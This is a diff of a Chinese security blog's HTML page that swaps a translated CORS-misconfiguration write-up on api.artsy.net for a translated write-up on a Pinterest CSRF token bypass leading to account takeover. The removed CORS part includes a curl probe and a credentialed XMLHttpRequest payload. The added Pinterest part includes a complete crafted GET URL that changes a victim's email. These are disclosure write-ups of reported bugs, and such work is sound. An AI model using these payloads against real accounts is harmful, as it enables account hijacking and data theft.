@@ -15,21 +15,17 @@
 
 
 
-<meta name="description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
+<meta name="description" content="原文：How I could have taken over any Pinterest account漏洞：GET请求绕过POST CSRF Token作者：Arnold Anthony难度：中">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第十篇翻译：CORS跨域请求">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/index.html">
+<meta property="og:title" content="第十八篇：CSRF导致账号接管">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/02/16/第十八篇：CSRF导致账号接管/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
+<meta property="og:description" content="原文：How I could have taken over any Pinterest account漏洞：GET请求绕过POST CSRF Token作者：Arnold Anthony难度：中">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2019-02-15T05:05:52.641Z">
+<meta property="og:updated_time" content="2019-02-16T11:41:17.732Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第十篇翻译：CORS跨域请求">
-<meta name="twitter:description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png">
+<meta name="twitter:title" content="第十八篇：CSRF导致账号接管">
+<meta name="twitter:description" content="原文：How I could have taken over any Pinterest account漏洞：GET请求绕过POST CSRF Token作者：Arnold Anthony难度：中">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>第十篇翻译：CORS跨域请求 | TimeS0ng&#39;s blog</title>
+<title>第十八篇：CSRF导致账号接管 | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -262,20 +258,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-第十篇翻译：CORS跨域请求" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第十八篇：CSRF导致账号接管" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/12/23/第十篇翻译：CORS跨域请求/" class="article-date">
-      <time datetime="2018-12-23T10:33:56.000Z" itemprop="datePublished">2018-12-23</time>
+      <a href="/2019/02/16/第十八篇：CSRF导致账号接管/" class="article-date">
+      <time datetime="2019-02-16T11:09:56.000Z" itemprop="datePublished">2019-02-16</time>
 </a>
 
  
-    <a href="/2018/12/23/第十篇翻译：CORS跨域请求/#comments" title="查看评论">
+    <a href="/2019/02/16/第十八篇：CSRF导致账号接管/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/12/23/第十篇翻译：CORS跨域请求/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2019/02/16/第十八篇：CSRF导致账号接管/"></span>
         
     </a>
 
@@ -290,7 +286,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      第十篇翻译：CORS跨域请求
+      第十八篇：CSRF导致账号接管
     </h1>
   
 
@@ -307,21 +303,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
-<h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png" alt=""></p>
-<h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
-<h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
-<p>[*]payload代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
-<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
-
-
-
-
-<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
-
+        <h4 id="原文：How-I-could-have-taken-over-any-Pinterest-account"><a href="#原文：How-I-could-have-taken-over-any-Pinterest-account" class="headerlink" title="原文：How I could have taken over any Pinterest account"></a>原文：<a href="http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/" target="_blank" rel="external">How I could have taken over any Pinterest account</a></h4><h4 id="漏洞：GET请求绕过POST-CSRF-Token"><a href="#漏洞：GET请求绕过POST-CSRF-Token" class="headerlink" title="漏洞：GET请求绕过POST CSRF Token"></a>漏洞：GET请求绕过POST CSRF Token</h4><h4 id="作者：Arnold-Anthony"><a href="#作者：Arnold-Anthony" class="headerlink" title="作者：Arnold Anthony"></a>作者：<a href="http://infosecflash.com/about/" target="_blank" rel="external">Arnold Anthony</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
+<h2 id="哪里有BUG？？"><a href="#哪里有BUG？？" class="headerlink" title="哪里有BUG？？"></a>哪里有BUG？？</h2><h4 id="emsp-emsp-当浏览”https-www-pinterest-com-quot-时，我发现CSRF-tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF-token的话，请求如下所示："><a href="#emsp-emsp-当浏览”https-www-pinterest-com-quot-时，我发现CSRF-tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF-token的话，请求如下所示：" class="headerlink" title="&emsp;&emsp;当浏览”https://www.pinterest.com&quot;时，我发现CSRF tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF token的话，请求如下所示："></a>&emsp;&emsp;当浏览”<a href="https://www.pinterest.com&quot;时，我发现CSRF" target="_blank" rel="external">https://www.pinterest.com&quot;时，我发现CSRF</a> tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF token的话，请求如下所示：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">POST /_ngjs/resource/UserSettingsResource/update/ HTTP/1.1</div><div class="line">Host: www.pinterest.com</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">X-CSRFToken: &lt;CSRF Token&gt;</div><div class="line">……..</div><div class="line">……..</div><div class="line">&lt;POST Parameters&gt;</div></pre></td></tr></table></figure>
+<h4 id="1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error-“-resource-UserSettingsResource-update-didn’t-finish-after-8-seconds”，这意味着CSRF令牌正在进行验证"><a href="#1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error-“-resource-UserSettingsResource-update-didn’t-finish-after-8-seconds”，这意味着CSRF令牌正在进行验证" class="headerlink" title="1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error “/resource/UserSettingsResource/update/ didn’t finish after 8 seconds”，这意味着CSRF令牌正在进行验证"></a>1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error “/resource/UserSettingsResource/update/ didn’t finish after 8 seconds”，这意味着CSRF令牌正在进行验证</h4><h4 id="2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200-ok”"><a href="#2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200-ok”" class="headerlink" title="2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200 ok”"></a>2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200 ok”</h4><h2 id="账号接管"><a href="#账号接管" class="headerlink" title="账号接管"></a>账号接管</h2><h4 id="emsp-emsp-这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change-request-method”来转换）"><a href="#emsp-emsp-这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change-request-method”来转换）" class="headerlink" title="&emsp;&emsp;这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change request method”来转换）"></a>&emsp;&emsp;这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change request method”来转换）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.pinterest.com/_ngjs/resource/UserSettingsResource/update/?source_url=%2Fsettings%2F&amp;data=%7B%22options%22%3A%7B%22impressum_url%22%3Anull%2C%22last_name%22%3A%22dummy%22%2C%22custom_gender%22%3Anull%2C%22locale%22%3A%22en-US%22%2C%22has_password%22%3Atrue%2C%22email_settings%22%3A%22Everything+%28except+emails+you%27ve+turned+off%29%22%2C%22news_settings%22%3A%22Activity+from+other+people+on+Pinterest%22%2C%22id%22%3A%22%22%2C%22is_write_banned%22%3Afalse%2C%22first_name%22%3A%22dummyuser%22%2C%22push_settings%22%3A%22Everything+%28except+push+you%27ve+turned+off%29%22%2C%22personalize_from_offsite_browsing%22%3Atrue%2C%22facebook_timeline_enabled%22%3Afalse%2C%22email_changing_to%22%3Anull%2C%22personalize_nux_from_offsite_browsing%22%3Afalse%2C%22is_tastemaker%22%3Afalse%2C%22type%22%3A%22user_settings%22%2C%22email%22%3A%22anytestemail%40user.com%22%2C%22website_url%22%3A%22%22%2C%22location%22%3A%22%22%2C%22username%22%3A%22dummyuser%22%2C%22pfy_preference%22%3Atrue%2C%22facebook_publish_stream_enabled%22%3Afalse%2C%22email_bounced%22%3Afalse%2C%22is_partner%22%3Anull%2C%22ads_customize_from_conversion%22%3Atrue%2C%22additional_website_urls%22%3A%5B%5D%2C%22about%22%3A%22test%22%2C%22gender%22%3A%22male%22%2C%22age%22%3Anull%2C%22exclude_from_search%22%3Afalse%2C%22birthdate%22%3Anull%2C%22show_impressum%22%3Afalse%2C%22email_biz_settings%22%3A%22Everything+%28includes+announcements%2C+expert+tips%2C+creative+ideas%2C+and+more%29%22%2C%22country%22%3A%22IN%22%2C%22hide_from_news%22%3Afalse%2C%22collaborative_boards%22%3A%5B%5D%7D%2C%22context%22%3A%7B%7D%7D</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail-user-com”，重置了电子邮件之后我就能通过邮箱地址重置密码"><a href="#emsp-emsp-当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail-user-com”，重置了电子邮件之后我就能通过邮箱地址重置密码" class="headerlink" title="&emsp;&emsp;当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail@user.com”，重置了电子邮件之后我就能通过邮箱地址重置密码"></a>&emsp;&emsp;当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail@user.com”，重置了电子邮件之后我就能通过邮箱地址重置密码</h4>
       
     </div>
     
@@ -329,13 +314,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/12/23/第十篇翻译：CORS跨域请求/">第十篇翻译：CORS跨域请求</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/16/第十八篇：CSRF导致账号接管/">第十八篇：CSRF导致账号接管</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-12-23, 18:33:56</p>
-        <p><span>最后更新:</span>2019-02-15, 13:05:52</p>
+        <p><span>发布时间:</span>2019-02-16, 19:09:56</p>
+        <p><span>最后更新:</span>2019-02-16, 19:41:17</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/12/23/第十篇翻译：CORS跨域请求/" title="第十篇翻译：CORS跨域请求">http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/16/第十八篇：CSRF导致账号接管/" title="第十八篇：CSRF导致账号接管">http://TimeS0ng.github.io/2019/02/16/第十八篇：CSRF导致账号接管/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/02/16/第十八篇：CSRF导致账号接管/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -347,16 +332,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/">
-                    第十一篇翻译：CSRF漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/12/23/第九篇翻译：CORS跨域请求/">
-                    第九篇翻译：CORS跨域请求
+                <a href="/2019/02/15/第十七篇：盗取登陆令牌/">
+                    第十七篇：盗取登陆令牌
                 </a>
             </div>
         
@@ -368,7 +347,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><span class="toc-number">1.</span> <span class="toc-text">原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：跨域请求"><span class="toc-number">2.</span> <span class="toc-text">漏洞：跨域请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Muhammad-Khizer-Javed"><span class="toc-number">3.</span> <span class="toc-text">作者：Muhammad Khizer Javed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><span class="toc-number">5.</span> <span class="toc-text">  大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><span class="toc-number">6.</span> <span class="toc-text"> 正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><span class="toc-number">7.</span> <span class="toc-text">  现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#视屏"><span class="toc-number"></span> <span class="toc-text">视屏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：How-I-could-have-taken-over-any-Pinterest-account"><span class="toc-number">1.</span> <span class="toc-text">原文：How I could have taken over any Pinterest account</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：GET请求绕过POST-CSRF-Token"><span class="toc-number">2.</span> <span class="toc-text">漏洞：GET请求绕过POST CSRF Token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Arnold-Anthony"><span class="toc-number">3.</span> <span class="toc-text">作者：Arnold Anthony</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：中"><span class="toc-number">4.</span> <span class="toc-text">难度：中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#哪里有BUG？？"><span class="toc-number"></span> <span class="toc-text">哪里有BUG？？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当浏览”https-www-pinterest-com-quot-时，我发现CSRF-tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF-token的话，请求如下所示："><span class="toc-number">1.</span> <span class="toc-text">  当浏览”https://www.pinterest.com"时，我发现CSRF tokens是通过http头”X-CSRFToken”传递的，所以正常情况下要验证CSRF token的话，请求如下所示：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error-“-resource-UserSettingsResource-update-didn’t-finish-after-8-seconds”，这意味着CSRF令牌正在进行验证"><span class="toc-number">2.</span> <span class="toc-text">1）首先，我将POST请求中的”X-CSRFToken”头删掉，然后通过burpsuit转发，服务器响应error “/resource/UserSettingsResource/update/ didn’t finish after 8 seconds”，这意味着CSRF令牌正在进行验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200-ok”"><span class="toc-number">3.</span> <span class="toc-text">2）然后，我将上面的POST请求更改为GET请求，同样删掉”X-CSRFToken”，转发之后我得到响应”200 ok”</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#账号接管"><span class="toc-number"></span> <span class="toc-text">账号接管</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change-request-method”来转换）"><span class="toc-number">1.</span> <span class="toc-text">  这是一个基于GET请求的CSRF，我们需要做的仅仅是制作一个URL链接，将所有通过POST传递的参数通过GET请求进行传递（不是所有程序都接受这种方法，大家可以通过burpsuit自带的”change request method”来转换）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail-user-com”，重置了电子邮件之后我就能通过邮箱地址重置密码"><span class="toc-number">2.</span> <span class="toc-text">  当用户点击上述链接后，它的用户名和电子邮件ID分别会被更改为”dummyuser”和”anytestemail@user.com”，重置了电子邮件之后我就能通过邮箱地址重置密码</span></a></li></ol>
         
     </div>
     <style>
@@ -404,7 +383,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"第十篇翻译：CORS跨域请求　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第十八篇：CSRF导致账号接管　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -461,15 +440,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/" title="上一篇: 第十一篇翻译：CSRF漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/12/23/第九篇翻译：CORS跨域请求/" title="下一篇: 第九篇翻译：CORS跨域请求">
+            <a href="/2019/02/15/第十七篇：盗取登陆令牌/" title="下一篇: 第十七篇：盗取登陆令牌">
                 <i class="fa fa-angle-right"></i>
             </a>
         
